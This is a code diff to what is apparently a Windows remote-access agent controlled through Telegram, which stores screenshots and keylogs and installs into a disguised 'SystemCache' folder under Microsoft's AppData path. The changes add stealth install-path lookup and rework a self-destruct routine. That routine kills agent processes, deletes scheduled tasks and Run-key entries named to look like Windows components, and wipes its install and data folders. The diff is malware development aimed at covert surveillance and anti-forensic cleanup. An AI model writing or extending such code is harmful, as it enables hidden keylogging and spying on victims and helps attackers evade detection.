@@ -48,7 +48,17 @@ TELEGRAM_ADMIN_ID = "6012569599"
 # Polling interval
 POLL_INTERVAL = 10  # seconds
 
-# Data directories
+# Install directory: where this script lives (matches install.ps1 stealth path)
+# Default install path from install.ps1: %LOCALAPPDATA%\Microsoft\Windows\SystemCache
+INSTALL_DIR = Path(__file__).resolve().parent
+
+# Stealth locations to search when reasoning about "find agent" (matches install.ps1)
+STEALTH_INSTALL_PATHS = [
+    Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Microsoft' / 'Windows' / 'SystemCache',
+    Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'C2Agent',  # legacy
+]
+
+# Data directories (screenshots, keylogs, persistent tasks)
 DATA_DIR = Path(os.environ.get('LOCALAPPDATA', Path.home() / '.c2agent')) / 'C2Agent'
 TASKS_FILE = DATA_DIR / 'persistent_tasks.json'
 SCREENSHOTS_DIR = DATA_DIR / 'screenshots'
@@ -58,6 +68,16 @@ KEYLOGS_DIR = DATA_DIR / 'keylogs'
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
 KEYLOGS_DIR.mkdir(parents=True, exist_ok=True)
+
+
+def get_install_dir() -> Path:
+    """Return the agent install directory (where agent.py lives). Uses __file__ or first existing stealth path."""
+    if INSTALL_DIR.exists() or (INSTALL_DIR / 'agent.py').exists():
+        return INSTALL_DIR
+    for p in STEALTH_INSTALL_PATHS:
+        if (p / 'agent.py').exists():
+            return p
+    return INSTALL_DIR  # fallback to script location
 
 
 # =============================================================================
@@ -990,47 +1010,57 @@ async def install_software(url: str) -> Tuple[str, bool]:
 async def self_destruct() -> Tuple[str, bool]:
     """
     SELF DESTRUCT: Completely remove the agent from the system.
-    - Removes scheduled tasks
-    - Removes registry entries
-    - Removes startup shortcuts
-    - Deletes all files (agent, venv, data)
+    - Removes scheduled tasks (C2Agent, MicrosoftWindowsCache)
+    - Removes registry entries (MicrosoftWindowsCache)
+    - Removes startup shortcuts (C2Update.lnk, C2Agent.lnk)
+    - Deletes install dir (where agent.py lives) and data dir (C2Agent)
     - Terminates the agent process
+    Uses stealth paths from install.ps1.
     """
     if platform.system() != "Windows":
         return "Self-destruct only supported on Windows", False
     
     try:
-        print("[SELF_DESTRUCT] Initiating cleanup sequence...")
+        install_dir = get_install_dir()
+        install_dir_str = str(install_dir).replace('"', '""')
+        data_dir_str = str(DATA_DIR).replace('"', '""')
+
+        print(f"[SELF_DESTRUCT] Install dir: {install_dir}, Data dir: {DATA_DIR}")
         cleanup_report = []
-        
-        # Create a self-deleting batch script
+
+        # Kill by CommandLine (matches install.ps1 logic) so we catch pythonw/python with agent.py
+        kill_ps = "Get-WmiObject Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*agent.py*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
+
+        # Create a self-deleting batch script using stealth paths
         batch_script = f'''@echo off
 echo [SELF_DESTRUCT] Phase 1: Stopping processes...
 timeout /t 2 /nobreak >nul
-
-REM Kill any remaining Python processes running agent.py
-taskkill /F /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *agent.py*" >nul 2>&1
+powershell -NoProfile -NonInteractive -Command "{kill_ps}" >nul 2>&1
 taskkill /F /FI "IMAGENAME eq pythonw.exe" >nul 2>&1
+taskkill /F /FI "IMAGENAME eq python.exe" >nul 2>&1
 
 echo [SELF_DESTRUCT] Phase 2: Removing persistence...
 
-REM Remove Scheduled Tasks
+REM Remove Scheduled Tasks (install.ps1: C2Agent = Admin, MicrosoftWindowsCache = Normal)
 schtasks /Delete /TN "C2Agent" /F >nul 2>&1
 schtasks /Delete /TN "MicrosoftWindowsCache" /F >nul 2>&1
 
-REM Remove Registry Run Keys
+REM Remove Registry Run Keys (install.ps1 stealth name)
 reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
 reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
 
-REM Remove Startup Shortcuts
+REM Remove Startup Shortcuts (install.ps1 fallback)
 del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" /f /q >nul 2>&1
 del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" /f /q >nul 2>&1
 
 echo [SELF_DESTRUCT] Phase 3: Deleting files...
 timeout /t 3 /nobreak >nul
 
-REM Delete installation directory
-rmdir /S /Q "{DATA_DIR.parent}" >nul 2>&1
+REM Delete install directory (agent.py, venv, requirements.txt - stealth path)
+if exist "{install_dir_str}" rmdir /S /Q "{install_dir_str}" >nul 2>&1
+
+REM Delete data directory (screenshots, keylogs, persistent_tasks.json)
+if exist "{data_dir_str}" rmdir /S /Q "{data_dir_str}" >nul 2>&1
 
 REM Delete this batch file
 del "%~f0"
